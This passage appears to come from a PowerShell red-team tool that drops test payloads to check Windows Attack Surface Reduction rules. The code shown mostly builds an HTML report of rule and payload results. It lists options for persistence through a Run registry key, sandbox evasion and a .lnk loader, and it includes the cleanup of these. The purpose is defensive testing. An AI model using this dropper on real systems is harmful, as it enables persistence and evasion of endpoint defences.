        .badge-not-triggered {
            background-color: #e74c3c;
            color: white;
        }
        .badge-skipped {
            background-color: #95a5a6;
            color: white;
        }
        .badge-error {
            background-color: #c0392b;
            color: white;
        }
        .badge-blocked {
            background-color: #8e44ad;
            color: white;
        }
        .badge-audit {
            background-color: #f39c12;
            color: white;
        }
        .badge-not-configured {
            background-color: #7f8c8d;
            color: white;
        }
        .section-toggle {
            cursor: pointer;
            user-select: none;
        }
        .section-toggle:hover {
            color: #3498db;
        }
        .section-toggle::after {
            content: ' v';
            font-size: 0.8em;
        }
        .section-toggle.collapsed::after {
            content: ' >';
        }
        .collapsible {
            display: block;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }
        .collapsible.collapsed {
            max-height: 0;
        }
        .config-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #eee;
        }
        .config-value {
            font-weight: bold;
        }
        .chart-container {
            height: 300px;
            margin: 20px 0;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #ddd;
            font-size: 0.9em;
            color: #7f8c8d;
        }
        .tab {
            overflow: hidden;
            border: 1px solid #ccc;
            background-color: #f1f1f1;
            border-radius: 5px 5px 0 0;
        }
        .tab button {
            background-color: inherit;
            float: left;
            border: none;
            outline: none;
            cursor: pointer;
            padding: 14px 16px;
            transition: 0.3s;
            font-size: 16px;
        }
        .tab button:hover {
            background-color: #ddd;
        }
        .tab button.active {
            background-color: white;
            border-bottom: 2px solid #3498db;
        }
        .tabcontent {
            display: none;
            padding: 20px;
            border: 1px solid #ccc;
            border-top: none;
            animation: fadeEffect 1s;
            border-radius: 0 0 5px 5px;
            background-color: white;
        }
        @keyframes fadeEffect {
            from {opacity: 0;}
            to {opacity: 1;}
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>ASR Dropper and Rules Testing Report</h1>
        </div>
        <div class="header-right">
            <p><strong>Generated:</strong> $timestamp</p>
            <p><strong>Location:</strong> $DropPath</p>
        </div>
    </div>

    <div class="tab">
        <button class="tablinks active" onclick="openTab(event, 'Summary')">Summary</button>
        <button class="tablinks" onclick="openTab(event, 'ASRRules')">ASR Rules Testing</button>
        <button class="tablinks" onclick="openTab(event, 'Payloads')">Dropper Payloads</button>
        <button class="tablinks" onclick="openTab(event, 'Configuration')">Configuration</button>
    </div>

    <div id="Summary" class="tabcontent" style="display: block;">
        <div class="container">
            <h2>Test Summary</h2>
            <div class="summary">
                <div class="summary-box">
                    <h3>Payloads</h3>
                    <p><strong>Created:</strong> $($payloads.Count)</p>
                    <p><strong>Executed:</strong> $(if ($Execute) { "Yes" } else { "No" })</p>
                    <p><strong>Success:</strong> $(($results | Where-Object { $_.Success }).Count) / $($results.Count)</p>
                </div>
                <div class="summary-box">
                    <h3>ASR Rules</h3>
                    <p><strong>Tested:</strong> $(if ($TestASR) { $($asrResults.Count) } else { "No" })</p>
                    <p><strong>Triggered:</strong> $(($asrResults | Where-Object { $_.TestState -eq "Triggered" }).Count)</p>
                    <p><strong>Standard Rules:</strong> $(($asrResults | Where-Object { $_.Standard -eq $true }).Count)</p>
                </div>
                <div class="summary-box">
                    <h3>Configuration</h3>
                    <p><strong>Persistence:</strong> $(if ($Persist) { "Enabled" } else { "Disabled" })</p>
                    <p><strong>Cleanup:</strong> $(if ($Cleanup) { "Enabled" } else { "Disabled" })</p>
                    <p><strong>Sandbox Evasion:</strong> $(if ($Evasion) { "Enabled" } else { "Disabled" })</p>
                </div>
            </div>
        </div>
    </div>

    <div id="ASRRules" class="tabcontent">
        <div class="container">
            <h2>Attack Surface Reduction Rules Testing</h2>
"@

    if ($TestASR -and $asrResults.Count -gt 0) {
        $standardRules = $asrResults | Where-Object { $_.Standard -eq $true }
        $otherRules = $asrResults | Where-Object { $_.Standard -eq $false }
        
        # Add Standard Rules section
        if ($standardRules.Count -gt 0) {
            $html += @"
            <h3 class="section-toggle">Standard Protection Rules ($($standardRules.Count))</h3>
            <div class="collapsible">
                <table>
                    <thead>
                        <tr>
                            <th>Rule Name</th>
                            <th>Rule ID</th>
                            <th>Category</th>
                            <th>Current State</th>
                            <th>Test Result</th>
                            <th>Details</th>
                        </tr>
                    </thead>
                    <tbody>
"@
            foreach ($rule in $standardRules) {
                $stateClass = switch ($rule.CurrentState) {
                    "1" { "badge-blocked" }
                    "2" { "badge-audit" }
                    "6" { "badge-audit" }
                    default { "badge-not-configured" }
                }
                
                $stateText = switch ($rule.CurrentState) {
                    "1" { "Block" }
                    "2" { "Audit" }
                    "6" { "Warn" }
                    default { "Not Configured" }
                }
                
                $resultClass = switch ($rule.TestState) {
                    "Triggered" { "badge-triggered" }
                    "Not Triggered" { "badge-not-triggered" }
                    "Skipped" { "badge-skipped" }
                    "Error" { "badge-error" }
                    default { "badge-skipped" }
                }
                
                $html += @"
                        <tr>
                            <td>$($rule.RuleName) <span class="badge badge-standard">Standard</span></td>
                            <td><code>$($rule.RuleId)</code></td>
                            <td>$($rule.Category)</td>
                            <td><span class="badge $stateClass">$stateText</span></td>
                            <td><span class="badge $resultClass">$($rule.TestState)</span></td>
                            <td>$($rule.TestDetails)</td>
                        </tr>
"@
            }
            $html += @"
                    </tbody>
                </table>
            </div>
"@
        }
        
        # Add Other Rules section
        if ($otherRules.Count -gt 0) {
            $html += @"
            <h3 class="section-toggle">Other Protection Rules ($($otherRules.Count))</h3>
            <div class="collapsible">
                <table>
                    <thead>
                        <tr>
                            <th>Rule Name</th>
                            <th>Rule ID</th>
                            <th>Category</th>
                            <th>Current State</th>
                            <th>Test Result</th>
                            <th>Details</th>
                        </tr>
                    </thead>
                    <tbody>
"@
            foreach ($rule in $otherRules) {
                $stateClass = switch ($rule.CurrentState) {
                    "1" { "badge-blocked" }
                    "2" { "badge-audit" }
                    "6" { "badge-audit" }
                    default { "badge-not-configured" }
                }
                
                $stateText = switch ($rule.CurrentState) {
                    "1" { "Block" }
                    "2" { "Audit" }
                    "6" { "Warn" }
                    default { "Not Configured" }
                }
                
                $resultClass = switch ($rule.TestState) {
                    "Triggered" { "badge-triggered" }
                    "Not Triggered" { "badge-not-triggered" }
                    "Skipped" { "badge-skipped" }
                    "Error" { "badge-error" }
                    default { "badge-skipped" }
                }
                
                $html += @"
                        <tr>
                            <td>$($rule.RuleName)</td>
                            <td><code>$($rule.RuleId)</code></td>
                            <td>$($rule.Category)</td>
                            <td><span class="badge $stateClass">$stateText</span></td>
                            <td><span class="badge $resultClass">$($rule.TestState)</span></td>
                            <td>$($rule.TestDetails)</td>
                        </tr>
"@
            }
            $html += @"
                    </tbody>
                </table>
            </div>
"@
        }
        
        # Add Chart for rule results
        $triggeredCount = ($asrResults | Where-Object { $_.TestState -eq "Triggered" }).Count
        $notTriggeredCount = ($asrResults | Where-Object { $_.TestState -eq "Not Triggered" }).Count
        $skippedCount = ($asrResults | Where-Object { $_.TestState -eq "Skipped" }).Count
        $errorCount = ($asrResults | Where-Object { $_.TestState -eq "Error" }).Count
        
        $html += @"
            <h3>Test Results Overview</h3>
            <div class="chart-container">
                <canvas id="rulesChart"></canvas>
            </div>
"@
    }
    else {
        $html += @"
            <div class="terminal">
                ASR Rules testing was not enabled or no rules were selected.
                Enable ASR Rules testing from the main menu option [A] to see results here.
            </div>
"@
    }
    
    $html += @"
        </div>
    </div>

    <div id="Payloads" class="tabcontent">
        <div class="container">
            <h2>Dropper Payloads</h2>
"@

    if ($results.Count -gt 0) {
        $html += @"
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Path</th>
                        <th>Result</th>
                    </tr>
                </thead>
                <tbody>
"@
        foreach ($r in $results) {
            $resultClass = if ($r.Success) { "success" } else { "danger" }
            $resultText = if ($r.Success) { "Success" } else { "Failed" }
            if (-not $Execute) {
                $resultClass = "passive"
                $resultText = "Not Executed"
            }
            
            $html += @"
                    <tr>
                        <td>$($r.Name)</td>
                        <td>$($r.Path)</td>
                        <td class="$resultClass">$resultText</td>
                    </tr>
"@
        }
        $html += @"
                </tbody>
            </table>
            
            <h3 class="section-toggle">Payload Details</h3>
            <div class="collapsible">
"@
        foreach ($r in $results) {
            $html += @"
                <h4>$($r.Name)</h4>
                <p><strong>Path:</strong> $($r.Path)</p>
                <div class="terminal">$($r.Output)</div>
"@
        }
        $html += @"
            </div>
"@
    }
    else {
        $html += @"
            <div class="terminal">
                No payload results available.
            </div>
"@
    }
    
    $html += @"
        </div>
    </div>

    <div id="Configuration" class="tabcontent">
        <div class="container">
            <h2>Test Configuration</h2>
            
            <h3>Dropper Settings</h3>
            <div class="config-item">
                <span>Execute Payloads:</span>
                <span class="config-value">$(if ($Execute) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Generate HTML Report:</span>
                <span class="config-value">$(if ($LogHtml) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Enable Persistence:</span>
                <span class="config-value">$(if ($Persist) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Create .lnk Shortcut:</span>
                <span class="config-value">$(if ($CreateShortcut) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Cleanup After Execution:</span>
                <span class="config-value">$(if ($Cleanup) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Include Signature Strings:</span>
                <span class="config-value">$(if ($Signatures) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Sandbox Evasion:</span>
                <span class="config-value">$(if ($Evasion) { "Yes" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>External Process:</span>
                <span class="config-value">$ExternalProcess</span>
            </div>
            
            <h3>ASR Rules Testing</h3>
            <div class="config-item">
                <span>Test ASR Rules:</span>
                <span class="config-value">$(if ($TestASR) { "Enabled" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>Selected Rules:</span>
                <span class="config-value">$($SelectedASRRules.Count)</span>
            </div>
"@

    if ($SelectedASRRules.Count -gt 0) {
        $html += @"
            <div class="config-item">
                <span>Rule IDs:</span>
                <span class="config-value">
                <ul style="list-style-type: none; padding-left: 0; margin: 0;">
"@
        foreach ($ruleId in $SelectedASRRules) {
            $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
            if ($rule) {
                $html += @"
                <li>$($rule.Name): <code>$($rule.Id)</code></li>
"@
            }
        }
        
        $html += @"
                </ul>
                </span>
            </div>
"@
    }

    $html += @"
        </div>
    </div>

    <div class="footer">
        <p>ASR Multi-Vector Dropper Tool | Generated on $timestamp</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.1/dist/chart.min.js"></script>
    <script>
        // Tab functionality
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }
        
        // Collapsible sections
        document.addEventListener('DOMContentLoaded', function() {
            var toggles = document.getElementsByClassName('section-toggle');
            for (var i = 0; i < toggles.length; i++) {
                toggles[i].addEventListener('click', function() {
                    this.classList.toggle('collapsed');
                    var content = this.nextElementSibling;
                    content.classList.toggle('collapsed');
                });
            }
        });
        
        // Charts
        document.addEventListener('DOMContentLoaded', function() {
            var rulesChart = document.getElementById('rulesChart');
            if (rulesChart) {
                new Chart(rulesChart, {
                    type: 'pie',
                    data: {
                        labels: ['Triggered', 'Not Triggered', 'Skipped', 'Error'],
                        datasets: [{
                            data: [$triggeredCount, $notTriggeredCount, $skippedCount, $errorCount],
                            backgroundColor: [
                                '#2ecc71',
                                '#e74c3c',
                                '#95a5a6',
                                '#c0392b'
                            ]
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: {
                                position: 'right',
                            },
                            title: {
                                display: true,
                                text: 'ASR Rules Test Results'
                            }
                        }
                    }
                });
            }
        });
    </script>
</body>
</html>
"@

    # Save HTML report
    Set-Content $logPath $html -Encoding UTF8
    Write-Host "`n[PDF] HTML report written to: $logPath" -ForegroundColor Cyan
    
    # Ask if user wants to open the report now
    $openReport = Read-Host "Open HTML report now? (y/n)"
    if ($openReport -eq "y") {
        Write-Host "Opening HTML report..." -ForegroundColor Green
        Start-Process $logPath
    } else {
        Write-Host "HTML report saved. You can open it manually later." -ForegroundColor Yellow
    }
}

# === Cleanup
if ($Cleanup) {
    # Only remove files in the Public folder that were created by this script
    $createdFiles = @($p1, $p2, $p3, $p4)
    if ($Signatures) { $createdFiles += $p5 }
    if ($CreateShortcut) { $createdFiles += "$DropPath\loader.lnk" }
    
    foreach ($file in $createdFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force
            Write-Host "Removed: $file" -ForegroundColor Gray
        }
    }
    
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" -ErrorAction SilentlyContinue
    Write-Host "[CLEAN] Cleanup complete" -ForegroundColor Green
}
else {
    Write-Host "`n[SUCCESS] Dropper complete" -ForegroundColor Green
    Write-Host "Files created in: $DropPath" -ForegroundColor Yellow
    if ($Persist) { Write-Host "[WARNING] Persistence enabled" -ForegroundColor Yellow }
    if ($LogHtml) { Write-Host "HTML report saved to: $logPath" -ForegroundColor Green }
    if (-not $Execute) { Write-Host "[INFO] Payloads not executed (toggle Execute to run)" -ForegroundColor Cyan }
}